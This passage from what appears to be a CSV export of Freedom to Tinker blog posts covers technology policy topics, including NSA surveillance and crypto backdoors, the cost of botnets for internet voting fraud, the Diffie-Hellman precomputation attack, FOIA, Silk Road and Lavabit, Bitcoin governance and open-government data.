encryption. At that time, the NSA had a trusted role in the community-wide effort to strengthen, not weaken, encryption. This algorithm is only one of multiple choices available within BSAFE toolkits, and users have always been free to choose whichever one best suits their needs. We continued using the algorithm as an option within BSAFE toolkits as it gained acceptance as a NIST standard and because of its value in FIPS compliance. When concern surfaced around the algorithm in 2007, we continued to rely upon NIST as the arbiter of that discussion. When NIST issued new guidance recommending no further use of this algorithm in September 2013, we adhered to that guidance, communicated that recommendation to customers and discussed the change openly in the media. RSA, as a security company, never divulges details of customer engagements, but we also categorically state that we have never entered into any contract or engaged in any project with the intention of weakening RSA’s products, or introducing potential ‘backdoors’ into our products for anyone’s use. RSA’s main claim here is that it didn’t know, at the time that it entered into the contract, that the algorithm it was agreeing to adopt was flawed. This is probably true, although RSA might have wondered why NSA was so eager to get RSA to adopt an algorithm that was (at the time) not yet fully standardized. The real question, though, is why RSA didn’t do anything in 2007, when it was discovered that Dual_EC_DRBG had a flaw that allowed backdooring and that the NSA had had the opportunity to set up a backdoor. Since then, the community has mostly avoided using the flawed algorithm. By 2007 it was also clear that the algorithm was much less efficient than the alternatives. The only part of the RSA statement that pertains to the 2007 period is the third bullet point: “We continued using the algorithm as an option within BSAFE toolkits as it gained acceptance as a NIST standard and because of its value in FIPS compliance. When concern surfaced around the algorithm in 2007, we continued to rely upon NIST as the arbiter of that discussion.” This would explain why RSA kept the flawed algorithm as an option for those few people who would want to use it, but it doesn’t explain why RSA would keep it as the default. NIST did not recommend any particular algorithm as a default, and as far as I know RSA is the only major provider that made Dual_EC_DRBG the default. It looks like RSA made a mistake in entering into the contract in the first place, and apparently giving up the right to use their own expert judgment about which crypto algorithms to recommend to their customers. So RSA’s defense is essentially that they didn’t undermine their customers’ security deliberately but only through bad judgment. That’s cold comfort for RSA customers—good security judgment is one of the main things one is looking for in a security company."
"259","2013-06-12","2023-03-24","https://freedom-to-tinker.com/2013/06/12/do-judges-play-a-role-after-the-nsa-call-records-have-been-collected/","Those who defend the NSA’s massive call records collection program point out that although the program allows indiscriminate data collection, it also meaningfully restricts data analysis and use. They note, in particular, this paragraph from Director of National Intelligence Clapper’s June 6, 2013, press release: By order of the FISC, the Government is prohibited from indiscriminately sifting through the telephony metadata acquired under the program. All information that is acquired under this program is subject to strict, court-imposed restrictions on review and handling. The court only allows the data to be queried when there is a reasonable suspicion, based on specific facts, that the particular basis for the query is associated with a foreign terrorist organization. Only specially cleared counterterrorism personnel specifically trained in the Court-approved procedures may even access the records. It seems to me that some have probably misunderstood this paragraph to suggest that the judges of the FISA Court (FISC) play a role in approving each individual query made to the data, the way a judge approves a warrant to search for or seize evidence in a criminal case. An article in Slate explained, somewhat approvingly, that “the rules that most of us would apply at the collection stage—reasonable suspicion, specific facts, court approval—are applied instead at the query stage”. A blog post author on Forbes explained that “[i]n order to analyze the data at hand, the NSA must get a court order justified by the reasonable suspicion of an imminent terrorist act.” Some legal scholars may be making the same assumption. I think these commentators are probably wrong. Director Clapper seems to talking about the FISC’s review of the overall program, not suggesting that FISC judges play a role in approving each query of the data. To some, this may not matter much. Many portray the FISC as a rubber stamp, not a meaningful check, a failure of checks and balances. I too worry about the independence of the FISC, but I would be a tiny bit less worried if I knew that a judge had to approve every single query to the database. But I doubt seriously that this is the case and I think people are misreading the press release. I wonder if this misconception is held broadly among the members of the general public who have been telling pollsters that they are not worried about the program. I wonder if legislators telling the press not to worry understand that once NSA has collected this data, no meaningful interbranch check operates. I would hope that something else stands between the NSA analyst and evidence of our patterns of behavior–audit requirements, mid-level management approvals–but I am betting that no judge occupies that position."
"260","2013-03-04","2023-03-24","https://freedom-to-tinker.com/2013/03/04/how-much-does-a-botnet-cost-and-the-impact-on-internet-voting/","A brief article on how much botnets cost to rent (more detail here) shows differing prices depending on whether you want US machines, European machines, etc. Interestingly, the highest prices go to botnets composed of US machines, presumably because the owners of those machines have more purchasing power and hence stealing credentials from those machines is more valuable. Even so, the value of each machine is quite low – $1000 for 10,000 infected US machines vs. $200 for 10,000 random machines around the world. [Reminds me of my youth where stamp collectors could get packets of random canceled stamps at different prices for “world” vs. specific countries – and most of the stuff in the world packets was trash.] So what does this have to do with voting? Well, at $1000 for 10,000 infected American machines, the cost is $0.10/machine, and less as the quantity goes up. If I can “buy” (i.e., steal) votes in an internet voting scheme for $0.10 each, that’s far cheaper than any form of advertising. In a hard-fought election I’ll get a dozen fliers for each candidate on the ballot, each of which probably costs close to $1 when considering printing, postage, etc. So stealing votes is arguably 100 times cheaper (assuming that a large fraction of the populace were to vote by internet), even when considering the cost of developing the software that runs in the botnet. Granted, not every machine in a botnet would be used for voting, even under the assumption that everyone voted by internet. But even if only 10% of them are, the cost per vote is still very “reasonable” under this scenario. And as John Sebes responded in an earlier draft of this posting: “You compared digital vote stealing costs to the costs of mere persuasion. What about the costs of analog vote stealing? It’s all anecdotal of course but I do hear that the going rate is about $35 from an absentee vote fraudster to a voter willing to sell a pre-signed absentee ballot kit. Even if the bad guys have to spend 100 of those dimes to get a 1-in-a-hundred machine that’s used for i-voting, that $10 is pretty good because $10 is cheaper than $35 and it and saves the trouble of paying the gatherers who are at risk for a felony.”"
"261","2015-10-14","2023-03-24","https://freedom-to-tinker.com/2015/10/14/how-is-nsa-breaking-so-much-crypto/","There have been rumors for years that the NSA can decrypt a significant fraction of encrypted Internet traffic. In 2012, James Bamford published an article quoting anonymous former NSA officials stating that the agency had achieved a “computing breakthrough” that gave them “the ability to crack current public encryption.” The Snowden documents also hint at some extraordinary capabilities: they show that NSA has built extensive infrastructure to intercept and decrypt VPN traffic and suggest that the agency can decrypt at least some HTTPS and SSH connections on demand. However, the documents do not explain how these breakthroughs work, and speculation about possible backdoors or broken algorithms has been rampant in the technical community. Yesterday at ACM CCS, one of the leading security research venues, we and twelve coauthors presented a paper that we think solves this technical mystery. The key is, somewhat ironically, Diffie-Hellman key exchange, an algorithm that we and many others have advocated as a defense against mass surveillance. Diffie-Hellman is a cornerstone of modern cryptography used for VPNs, HTTPS websites, email, and many other protocols. Our paper shows that, through a confluence of number theory and bad implementation choices, many real-world users of Diffie-Hellman are likely vulnerable to state-level attackers. For the nerds in the audience, here’s what’s wrong: If a client and server are speaking Diffie-Hellman, they first need to agree on a large prime number with a particular form. There seemed to be no reason why everyone couldn’t just use the same prime, and, in fact, many applications tend to use standardized or hard-coded primes. But there was a very important detail that got lost in translation between the mathematicians and the practitioners: an adversary can perform a single enormous computation to “crack” a particular prime, then easily break any individual connection that uses that prime. How enormous a computation, you ask? Possibly a technical feat on a scale (relative to the state of computing at the time) not seen since the Enigma cryptanalysis during World War II. Even estimating the difficulty is tricky, due to the complexity of the algorithm involved, but our paper gives some conservative estimates. For the most common strength of Diffie-Hellman (1024 bits), it would cost a few hundred million dollars to build a machine, based on special purpose hardware, that would be able to crack one Diffie-Hellman prime every year. Would this be worth it for an intelligence agency? Since a handful of primes are so widely reused, the payoff, in terms of connections they could decrypt, would be enormous. Breaking a single, common 1024-bit prime would allow NSA to passively decrypt connections to two-thirds of VPNs and a quarter of all SSH servers globally. Breaking a second 1024-bit prime would allow passive eavesdropping on connections to nearly 20% of the top million HTTPS websites. In other words, a one-time investment in massive computation would make it possible to eavesdrop on trillions of encrypted connections. NSA could afford such an investment. The 2013 “black budget” request, leaked as part of the Snowden cache, states that NSA has prioritized “investing in groundbreaking cryptanalytic capabilities to defeat adversarial cryptography and exploit internet traffic.” It shows that the agency’s budget is on the order of $10 billion a year, with over $1 billion dedicated to computer network exploitation, and several subprograms in the hundreds of millions a year. Based on the evidence we have, we can’t prove for certain that NSA is doing this. However, our proposed Diffie-Hellman break fits the known technical details about their large-scale decryption capabilities better than any competing explanation. For instance, the Snowden documents show that NSA’s VPN decryption infrastructure involves intercepting encrypted connections and passing certain data to supercomputers, which return the key. The design of the system goes to great lengths to collect particular data that would be necessary for an attack on Diffie-Hellman but not for alternative explanations, like a break in AES or other symmetric crypto. While the documents make it clear that NSA uses other attack techniques, like software and hardware “implants,” to break crypto on specific targets, these don’t explain the ability to passively eavesdrop on VPN traffic at a large scale. Since weak use of Diffie-Hellman is widespread in standards and implementations, it will be many years before the problems go away, even given existing security recommendations and our new findings. In the meantime, other large governments potentially can implement similar attacks, if they haven’t already. Our findings illuminate the tension between NSA’s two missions, gathering intelligence and defending U.S. computer security. If our hypothesis is correct, the agency has been vigorously exploiting weak Diffie-Hellman, while taking only small steps to help fix the problem. On the defensive side, NSA has recommended that implementors should transition to elliptic curve cryptography, which isn’t known to suffer from this loophole, but such recommendations tend to go unheeded absent explicit justifications or demonstrations. This problem is compounded because the security community is hesitant to take NSA recommendations at face value, following apparent efforts to backdoor cryptographic standards. This state of affairs puts everyone’s security at risk. Vulnerability on this scale is indiscriminate—it impacts everybody’s security, including American citizens and companies—but we hope that a clearer technical understanding of the cryptanalytic machinery behind government surveillance will be an important step towards better security for everyone. For more details, see our research paper: Imperfect Forward Secrecy: How Diffie-Hellman Fails in Practice. (Update: We just received the Best Paper Award at CCS 2015!) J. Alex Halderman is an associate professor of Computer Science and Engineering at the University of Michigan and director of Michigan’s Center for Computer Security and Society. Nadia Heninger is an assistant professor of Computer and Information Science at the University of Pennsylvania."
"262","2014-03-05","2023-03-24","https://freedom-to-tinker.com/2014/03/05/foia-when-the-exemptions-swallow-the-rule/","I’ve been researching and writing over the last few years on privately ordered—what the government calls “non-regulatory”—approaches to online IP enforcement. The gist of this approach is that members of trade groups representing different types of online intermediaries (broadband providers, payment processors, ad networks, online pharmacies) agree in private contracts or less formal “voluntary best practices” documents to sanction or cut services to alleged IP infringers. I put quotes around “non-regulatory” not only because that’s the government’s word, but because the descriptor masks the fact that the government, at the behest of corporate rights owners, leans heavily on targeted intermediaries to negotiate and accept these agreements, all the while holding the threat of regulation over their heads. It has proven to be a very effective strategy. Many of the website blocking provisions in SOPA, which so memorably went down in flames of public outrage, have subsequently been implemented through these agreements, which belong to a broad category of regulatory practices that governance scholars call soft law. Soft law arrangements between corporate rights owners and online intermediaries raise lots of concerns about due process and First Amendment rights, because such arrangements generally don’t provide for any neutral adjudication of accusations of infringement. (The “six strikes” protocol for deterring unlawful P2P file-sharing, about which you can read more here, is a notable exception.) Moreover, there is no occasion for judicial scrutiny of the constitutional issues arising from these private arrangements, because there is no state action to trigger review. The arrangements have the effect of public law, insofar as they impact millions of members of the public, but without accountability to the public. The way most of these arrangements work is as follows: A corporate rights owner makes an accusation of infringement or counterfeiting to a participating online intermediary. The complaint triggers some form of investigation internal to the intermediary. Following the investigation, a sanction is imposed if the accused website operator cannot prove his or her innocence to the intermediary’s satisfaction. The sanction can be as severe as termination of service by the participating intermediary. Unlike in a civil court case, where the burden of proof is on the complainant, the burden under these protocols is on the accused to prove that she is not an infringer. My current work in this area focuses on a code of voluntary best practices adopted by payment processors like Visa, MasterCard, and PayPal. The document is referenced multiple times in the Office of the Intellectual Property Enforcement Coordinator’s 2013 Joint Strategic Plan. In connection with my research, I asked a librarian with whom I work to submit a FOIA request to IPEC. I was curious to know the nature and extent of IPEC’s role as a midwife for these private enforcement arrangements. The request submitted was for “any documents pertaining to the development or drafting of a code of voluntary best practices for payment processors or intermediaries with respect to online transactions.” IPEC recently responded to the request. It said that it had located 60 relevant documents, including the four-page best practices document. It refused, however, to produce any of the responsive documents, citing Exemptions 4 and 5 of FOIA. Exemption 4 is basically for trade secrets entrusted to the government by third parties. Exemption 5 covers documents relating to the “deliberative process” of an agency engaged in rule-making. Given IPEC’s own claim that the voluntary best practices approach is non-regulatory, it seems highly questionable for IPEC to have invoked the deliberative process privilege. This is particularly true in light of President Obama’s directive to agency heads that a presumption of disclosure should apply to all decisions involving FOIA. I was ultimately able to get the four-page best practices document from the International Anti-Counterfeiting Coalition (IACC), which operates as the point of intake for complaints by corporate rights owners. Given that the document is a collection of industry-embraced “best practices” that applies to every website operator that accepts third-party payments, it should be openly available. And IPEC’s role in its development should be a matter of public record."
"263","2013-10-03","2023-03-24","https://freedom-to-tinker.com/2013/10/03/silk-road-lavabit-and-the-limits-of-crypto/","Yesterday we saw two stories that illustrate the limits of cryptography as a shield against government. In San Francisco, police arrested a man alleged to be Dread Pirate Roberts (DPR), the operator of online drug market Silk Road. And in Alexandria, Virginia, a court unsealed documents revealing the tussle between the government and secure email provider Lavabit. Silk Road was essentially the eBay of illegal drugs. Silk Road was operated as a Tor hidden service, meaning that it was very difficult to determine where the servers were located; and payments were handled via Bitcoin, which also provides some degree of anonymity. DPR bragged that Silk Road eliminated the violent turf wars that are endemic in face-to-face drug markets, because the technology made it practically impossible for one seller to track down another. It was all arms-length, protected by crypto. But things didn’t work out so neatly for DPR. According to the criminal complaint, he twice contracted for the killing of Silk Road participants, one a participant who was blackmailing him and the other an employee who had cheated him. Fortunately neither killing was carried out, although DPR apparently paid for both, having been tricked into believing that they had been carried out. Crypto also failed to protect DPR from being tracked down, probably because of failures in his operational security, such as using accounts linkable to his real name to promote Silk Road early in its development. Reading the documents, one senses that some significant details of are still being withheld. Is this a failure of crypto? Yes and no. While it’s true that Silk Road is now shut down and the alleged DPR is in custody, it’s also true that Silk Road stayed up for a long time and processed hundreds of millions of dollars worth of transactions, and that DPR eluded identification for a long time. The lesson is that crypto can make it much harder for investigators to unravel an operation—but not impossible. The other story concerns Lavabit, a secure email provider used by Edward Snowden, among many others. Lavabit relied on crypto to protect its users’ emails. On August 8, 2013, owner Ladar Levison shut down Lavabit, saying that staying in business would have forced Lavabit to choose between defying the law and betraying its users. Further details were part of a sealed court proceeding. Yesterday the court unsealed the documents, so we now have a better idea of what happened. The court ordered Lavabit to turn over metadata (to, from, size, date/time information) on all of the email of an unspecified account (presumably Snowden’s). Lavabit had refused, and prosecutors responded by asking the court to order Lavabit to disclose Lavabit’s primary private key—which would give the government the ability to spy on every single Lavabit user. The court granted this request. After some gamesmanship—which got Lavabit fined for contempt of court—Lavabit shut itself down, making the private key disclosure moot. The court clearly felt that Lavabit had not taken its previous orders seriously enough—and judges tend to get aggressive with parties who they feel are defying the court’s authority. If it were only Lavabit’s own security that was at stake, this would look like a case of a judge getting fed up with Lavabit, and Lavabit paying the consequences. But here it was the interests of Lavabit’s users that were impacted by the court’s order. And those users could not make an argument against the order because the case was secret. One suspects that the privacy interests of 400,000 users were undermined because the judge was mad at Lavabit. In making his order, the judge said this: [The] government’s clearly entitled to the information that they’re seeking, and just because you-all have set up a system that makes that difficult, that doesn’t in any way lessen the government’s right to receive that information just as they could from any telephone company or any other e-mail source that could provide it easily”. I was surprised that a court would go so far as to order Lavabit to turn over the security crown jewels. Turning over this information would have put Lavabit in a position of essentially lying to its users about security. While it’s true that Lavabit might have headed this off by being more cooperative earlier, when only the Snowden account was at issue, this chain of events only serves to undermine users’ trust in U.S.-based technology providers. Lavabit shut down rather than lie to its users, but that’s more than most providers would have done."
"264","2013-02-25","2023-03-24","https://freedom-to-tinker.com/2013/02/25/the-state-of-connectivity-in-latin-america-from-mobile-phones-to-tablets/","Ten years ago, issues like e-health, e-education and e-government were more products of wishful thinking than ideas with a real possibility of being implemented in most Latin American countries. Conversely, the present moment has become a turning point for the region in terms of connectivity. Government policies, markets and non-profit initiatives are contributing to improve the overall connectivity in the region. By 2012 98% of the population in the region had access to a mobile cell signal and 84% of households subscribe to some type of mobile service, according to a World Bank report. This rather quick expansion of ICTs in Latin America and the Caribbean (LAC) caught many intellectual property and access to knowledge scholars and practitioners unprepared. While they were still considering hypothetical models for deploying and using information and communication technologies (ICTs), a significant portion of the region’s population was already putting in practice innovative uses to newly available technology, and going beyond expectations in terms of self-organization and empowerment. Examples include the emergence and expansion of cultural scenes in various LAC countries, tilting the symbolic balance from a centralized “one to many” to a decentralized “many to many” form of cultural production. Web services like Youtube or 4shared, created the conditions to disseminate cultural artifacts head to head with the mainstream forms of culture. Previously invisible voices from the region’s peripheries were thus empowered by tools like social networks and torrents, by-passing the traditional media channels. Moreover, the economic constraints surrounding connectivity also led to innovative strategies, such as the emergence of lan-houses, cybercafés that emerged in poor areas of the region (and prominently in Brazil) where a single internet connection could be shared in exchange for a small amount of money by a group of people connected by means of a set of computers arranged in a “local area network”. Other arrangements include the emergence of a secondary market for cell phone “minutes”, a direct result of the fact that more than 80% of cell phones in the region are “pre-paid”. Also important, the enormous potential of this low income market resonated even in hardware design and manufacturing. Asian companies realized the huge demand on the part of the poor for cell phones and started to design and sell inexpensive products, designed for low income populations. These include, for example, cell phones that cost US$20 and are capable of using 4 simultaneous sim-cards, allowing the user to switch between different carriers in order to enjoy the lowest fares and seasonal promotions, and cell phones capable of receiving radio and tv signals over the air, something highly valued by large parts of the population living in underprivileged areas. Of course all these rapid changes and the new social practices they introduce clash with traditional forms of intellectual property and other established norms. The dissemination of culture through social networks or by means of torrents, in many cases, violates copyright laws. The use of “remix” as a form of expression, in which cultural artifacts are endlessly appropriated and transformed in order to embed new ideas, has become a central form of expression by the connected low income populations. Also, the cheap cell phones used in the shantytowns of many LAC cities are manufactured in violation of a number of established patents or do not comply with the certification standards of national telecommunications regulatory agencies. One of the challenges ahead is precisely to better understand the disconnection between the legal and regulatory system, and the connectivity practices of the majority of the region’s population. While cell phones have so far been the centerpiece of recent debate about the digital divide, a new challenge is emerging for researchers, policy makers and practitioners: to anticipate the impact of the increasing number of tablets. A powerful signal of their relevance comes from Brazil. In late 2011, the country had 200,000 tablets but by late 2012, that number had exploded to 5 million, with more than 50% of them being low-cost tablets of unknown brands (mostly manufactured in China), purchased by low-income populations that do not have the resources (or do not want) to acquire top-tier brands like Apple or Samsung. In the same way that many people in the region purchased a cell phone without ever having had a fixed phone line, we are now witnessing a moment in which a large number of people are buying a tablet, without ever having had a computer. This “straight to tablet” movement will raise a number of questions and challenges. What will be the content that is going to be accessed through them? Certainly it will not be books downloaded from Amazon, or movies purchased through iTunes – both are too expensive for low income families in the region that cannot afford to pay US$8 dollars for a book or US$1 for one single music track. Also, e-education might become a crucial issue. In the next 10 years, tablets will become increasingly present in classrooms. This raises questions such as what will be the copyright policies regarding such educational materials? or how will the transition to multimedia learning materials happen in the region? If classroom materials start to include films or music, collecting societies that charge royalties for the public performance of copyrighted works will certainly want collect fees from schools. If music is performed in public spaces, be they schools or ballrooms, copyright royalties are due and must be collected. The next few years will show whether the transition to multimedia learning materials in schools will represent another clash between intellectual property and social practices. In sum, the issues that face us over the next few years will have tremendous impact for our societies and intellectual property researchers, educators, industry, policymakers and will all have to be prepared to anticipate the technological changes that are rapidly transforming the ecology of access in Latin America and the Caribbean. Ignoring them will not only hamper innovation in the region, but also keep vast parts of the LAC population living somewhere between the formal and the informal world. That creates a vast class of citizens that cannot fully benefit from the expanding access to ICTs without the stigma of illegality. *** This post is part of the “Open Development: Exploring the future of the information society in Latin America and the Caribbean”, a conference that will take place in Montevideo, Uruguay on the 2nd & 3rd of April 2013, in preparation to the Fourth Ministerial Conference on the Information Society for Latin America and the Caribbean. More info at: http://www.info25.org/en"
"265","2017-02-10","2023-03-24","https://freedom-to-tinker.com/2017/02/10/engineering-around-social-media-border-searches/","The latest news is that the U.S. Department of Homeland Security is considering a requirement, while passing through a border checkpoint, to inspect a prospective visitor’s “online presence”. That means immigration officials would require users to divulge their passwords to Facebook and other such services, which the agent might then inspect, right there, at the border crossing. This raises a variety of concerns, from its chilling impact on freedom of speech to its being an unreasonable search or seizure, nevermind whether an airport border agent has the necessary training to make such judgments, much less the time to do it while hundreds of people are waiting in line to get through. Rather than conduct a serious legal analysis, however, I want to talk about technical countermeasures. What might Facebook or other such services do to help defend their users as they pass a border crossing? Fake accounts. It’s certainly feasible today to create multiple accounts for yourself, giving up the password to a fake account rather than your real account. Most users would find this unnecessarily cumbersome, and the last thing Facebook or anybody else wants is to have a bunch of fake accounts running around. It’s already a concern when somebody tries to borrow a real person’s identity to create a fake account and “friend” their actual friends. Duress passwords. Years ago, my home alarm system had the option to have two separate PINs. One of them would disable the alarm as normal. The other would sound a silent alarm, summoning the police immediately while making it seem like I disabled the alarm. Let’s say Facebook supported something similar. You enter the duress password, then Facebook locks out your account or switches to your fake account, as above. Temporary lockouts. If you know you’re about to go through a border crossing, you could give a duress password, as above, or you could arrange an account lockout in advance. You might, for example, designate ten trusted friends, where any five must declare that the lockout is over. Absent those declarations, your account would remain locked, and there would be no means for you to be coerced into giving access to your own account. Temporary sanitization. Absent any action from Facebook, the best advice today for somebody about to go through a border crossing is to sanitize their account before going through. That means attempting to second-guess what border agents are looking for and delete it in advance. Facebook might assist this by providing search features to allow users to temporarily drop friends, temporarily delete comments or posts with keywords in them, etc. As with the temporary lockouts, temporary sanitization would need to have a restoration process that could be delegated to trusted friends. Once you give the all-clear, everything comes back again. User defense in bulk. Every time a user, going through a border crossing, exercises a duress password, that’s an unambiguous signal to Facebook. Even absent such signals, Facebook would observe highly unusual login behavior coming from those specific browsers and IP addresses. Facebook could simply deny access to its services from government IP address blocks. While it’s entirely possible for the government to circumvent this, whether using Tor or whatever else, there’s no reason that Facebook needs to be complicit in the process. So is there a reasonable alternative? While it’s technically feasible for the government to require that Facebook give it full “backdoor” access to each and every account so it can render threat judgments in advance, this would constitute the most unreasonable search and seizure in the history of that phrase. Furthermore, if and when it became common knowledge that such unreasonable seizures were commonplace, that would be the end of the company. Facebook users have an expectation of privacy and will switch to other services if Facebook cannot protect them. Wouldn’t it be nice if there was some less invasive way to support the government’s desire for “extreme vetting”? Can we protect ordinary users’ privacy while still enabling the government to intercept people who intend harm to our country? We certainly must assume that an actual bona fide terrorist is going to have no trouble creating a completely clean online persona to use while crossing a border. They can invent wholesome friends with healthy children sharing silly videos of cute kittens. While we don’t know too much about our existing vetting strategies to distinguish tourists from terrorists, we have to assume that the process involves the accumulation of signals and human intelligence, and other painstaking efforts by professional investigators to protect our country from harm. It’s entirely possible that they’re already doing a good job."
"266","2017-01-17","2023-03-24","https://freedom-to-tinker.com/2017/01/17/gis-analysis-as-a-research-communication-tool/","The power of geospatial analysis lies in the new ways it provides to look at datasets and the relations among them. It allows you to explore more nuanced questions and discover correlations previously hidden. Used properly, geographic information system (GIS) tools can increase the saliency of a policy issue by expressing your argument visually and often much more effectively. Below is my recent experience in using GIS tools to broaden the audience for my research. Property Assessment Disparities Municipalities across the country are under fiscal duress due to cuts in state/federal aid, property tax levy limits, and rising employee fringe benefit costs. Often limited in their ability to generate new revenue streams, municipalities have become overly dependent on property taxes to “keep the lights on”. Taxes are always a contentious issue and nobody wants to pay more than their fair share. To get a sense of how equitable the property tax burden was in Milwaukee, a city wrestling with all of the challenges noted above, I analyzed 33,000 property sales transactions over a 10-year period and compared them with their corresponding assessment values. By regressing the assessment value/sales price ratio on a host of predictors including building condition, lot size, geographic location, etc., I was able to get a sense of how equitable the city’s property taxation system is. While the findings presented an interesting disparity in who was paying their fair share, the results were neither accessible to the average citizen nor actionable for the policy maker. They required an understanding of my model specification and an ability to interpret coefficients expressed in terms of log odds. Before I discuss how geospatial analysis broadened the audience for my research let us briefly digress into what property assessments are and why we should care about them. What Are Property Assessments and Why Should We Care? Property assessments are a key determinant in your property taxes; the higher the assessment, the higher the tax bill. While your assessment is a function of many factors, including lot size and property condition, the single largest determinant is market value. Your property assessment should reflect the price you could sell it for in an arm’s length market transaction. The Insights of Geospatial Analysis Utilizing GIS tools changed the nature of the questions I could explore within my dataset. I was now able to investigate additional questions related to geographic patterns in the results. To the right is a heat map analysis of property assessment disparities aggregated at the census block group level. The geographic clustering is remarkable. It is clear that segments of the city are paying more in taxes than the value of their property suggests while others are paying less. Curious about how this distribution compared with other salient attributes, I created additional heat maps of median income and % of black residents below. Given the complexity and cost of fighting property tax assessments, the correlation with income is not surprising. The findings suggest that providing technical help for low-income homeowners interested in contesting their assessments may be one approach to combat the observed disparities. As I have reached out to interested parties across the country regarding my findings, I cannot overstate the effectiveness of presenting the results in a geospatial context in generating interest and facilitating conversations. As governments across the country release more datasets as part of the open data movement and IoT technologies provide a litany of new metrics, it will become increasingly important that we analyze and present data in ways that are actionable and understandable to policy makers and citizens."
"267","2013-06-20","2023-03-24","https://freedom-to-tinker.com/2013/06/20/open-source-governance-in-bitcoin/","Josh Kroll, Ian Davey, and I have a new paper, The Economics of Bitcoin Mining, or Bitcoin in the Presence of Adversaries, from the Workshop on Economics of Information Security. Our paper looks at the dynamics of Bitcoin, how resilient it would be in the face of attacks, and how Bitcoin is governed. Today I want to talk about governance in Bitcoin. I wrote previously about how Bitcoin relies on two forms of consensus: a social consensus about the rules that govern which transactions and log blocks are considered valid, and an informational consensus about the contents of the Bitcoin log (a list of all the transactions that have occurred). These two forms of consensus make possible a third consensus: that Bitcoins have value. I described in the previous post how the Bitcoin community has changed the rules, by consensus, to deal with technical mishaps. We argue in our paper that further rule changes will be necessary to deal with longer-term economic challenges, such as how to maintain a sufficient level of mining activity. At present, governance of Bitcoin is tied together with governance of the Bitcoin reference software, because most people either use the reference software or emulate its behavior. So Bitcoin has a de facto governance structure, based on the governance of the reference software—and in fact the lead developers of the reference software are seen as leaders in the Bitcoin community. The reference software follows a standard open-source model. And the political dynamics of open-source projects are interesting. Typically there is a person or group who makes final decisions about which proposed changes to the software are accepted into the next release. In one sense, these deciders might seem to have absolute power to determine the direction of the software. But their power is limited by the possibility that someone will fork the software. Anyone, at any time, can create their own version of the software, by copying the code and then setting themselves up as deciders for the new “forked” copy. Of course, the fork is unlikely to survive or to have any importance at all, unless a substantial number of participants switch from the original version to the forked version. So the possibility of a fork disciplines the deciders. As long as their decisions are well-aligned with the interests of the participants, then there is little chance that participants would want to start or join a fork. But if the deciders start to deviate from what participants want, then a fork becomes likely—and the forked version may acquire dominant market share and become the new de facto standard. It’s a standard story about how the possibility of exit disciplines the leaders of a group—except that forking is an especially strong form of exit in which the departing members get to keep using and improving the group’s main product, so the right to fork gives members more power than a simple right to exit would. But it’s not just the Bitcoin software that can fork. It’s also possible for the Bitcoin rules to fork. Imagine that half of the Bitcoin community started following Ruleset A, while at the same moment the other half started following Ruleset B. (Either A or B could be the same as the current rules; that doesn’t matter.) The result would be a fork in the Bitcoin log—the two groups would agree on the history up until the rule-fork, but after the rule-fork each group would have its own idea of the log, reflecting its own understanding of the history of Bitcoin transactions that had occurred. In effect, this would be a fork of the currency. What was once a single Bitcoin currency would be replaced by two currencies, which we might call BitcoinA and BitcoinB, which had different rules and diverging histories. If you owned a single Bitcoin at the fork point, then just after the fork point you would own a single BitcoinA and a single BitcoinB, which you could then dispose of separately. As with a software fork, either branch might end up dying out due to lack of interest, but it’s also possible that both could survive in the long run. Whatever power the lead software developers, or anyone else, might have to control the rules of Bitcoin will be limited by the ability of others to fork the rules, and therefore to fork the currency. (To be clear: forking the currency is not the same as starting a new currency with your own rules. What makes a fork special is that the forked version considers the original version to be valid, and its rules to be governing, up until the fork point. A fork is like a religious schism, in which each branch considers itself to be the one true successor of a common tradition.) Bitcoin is a new kind of thing: a currency whose rules are determined by open-source governance. What does this mean for governments that want to regulate Bitcoin? I’ll consider that question in a future post."
"268","2013-04-02","2023-03-24","https://freedom-to-tinker.com/2013/04/02/two-major-updates-to-recap-developers-from-around-the-world-write-code-in-memory-of-aaron-swartz/","A little over two months ago, we joined with the Think Computer Foundation to offer a set of grants in memory of our friend Aaron Swartz. Aaron worked on many issues in his too-short life, but one of those was liberating American court records from behind a pay-wall. He helped to inspire our RECAP project, which has allowed thousands of people to legally liberate and share millions of public records. We didn’t know if anyone would take up the challenge, but today we are extremely pleased to award two of these grants. These awards recognize some truly amazing coding by software developers that were inspired by Aaron Swartz and his causes. Over the past several years, the two most-requested features for RECAP have been support for US Courts of Appeals (a.k.a. circuit courts), and a version of RECAP that works with the Chrome browser. Ka-Ping Yee, Filippo Valsorda, and Alessio Palmero Aprosio represent the best kind of technological idealists. They are idealists that not only believe in worthy causes, but also have the engineering expertise and the dogged determination to see their vision through. Read more about them and install their code at recapthelaw.org."
"269","2014-03-26","2023-03-24","https://freedom-to-tinker.com/2014/03/26/reflecting-on-sunshine-week/","Last Wednesday evening, I attended the D.C. Open Government Summit: Street View, which took place at the National Press Club in conjunction with Sunshine Week. The Summit was sponsored by the D.C. Open Government Coalition, a non-profit that “seeks to enhance the public’s access to government information and ensure the transparency of government operations of the District of Columbia.” The Summit successfully focused on two main ideas – using government information to innovate and using government information to inform. I left the Summit encouraged by the enthusiasm for innovation and transparency in the attendees and among some District of Columbia government leaders, but also discouraged because there was a consensus that Washington, DC is still far behind cities such as New York, Kansas City, and Boston in using technology for innovation in government and there is not a vision or financial commitment from the Mayor’s office to facilitate government-wide progress. In her keynote address, Traci Hughes, the Director of the District of Columbia Office of Open Government, commented that her office only has two employees and almost no budget beyond that for salaries. She has, therefore, been looking to certain District government agencies and non-profit partners outside of government to support her vision for a more open government. Ms. Hughes commented, for example, that the Council of the District of Columbia’s General Counsel has been a great partner, as has been the Office of the State Superintendent of Education, which has been a leader in making information about education available to parents. Ms. Hughes recognized Code for DC, the all-volunteer local chapter of Code for America, for producing “ANC Finder,” an application that provides residents, based on their address, with information about their Advisory Neighborhood Commission – DC’s hyper-local level of government where each Commissioner represents approximately 2,000 people. Ms. Hughes, however, has a broader vision for open access to the District of Columbia’s data and records. Ms. Hughes stated that the Council of the District of Columbia and the Mayor need to pass legislation to drive the open government process. In addition, the city must do more to bridge the gaps between people with varying levels of Internet access. I interpreted this statement as her way of saying that many more city services should be accessible through mobile devices. Indeed, a 2013 Pew study indicates that 10% of urban residents have a smartphone, but no home broadband connection. Making government services available through mobile devices was one of the themes of the evening. The representatives from Code for DC stressed the importance of moving government processes to mobile platforms. The process of applying for public housing, for example, often involves filling out a different paper form for each potential housing option for which a person is applying. While the non-profit Bread for the City is currently helping people with the paper forms, Code for DC volunteers are working toward a technology-based solution. In addition, people are lobbying to make filing a Freedom of Information Act request and contesting a property tax assessment possible through mobile devices. I had a great side conversation with a Code for DC 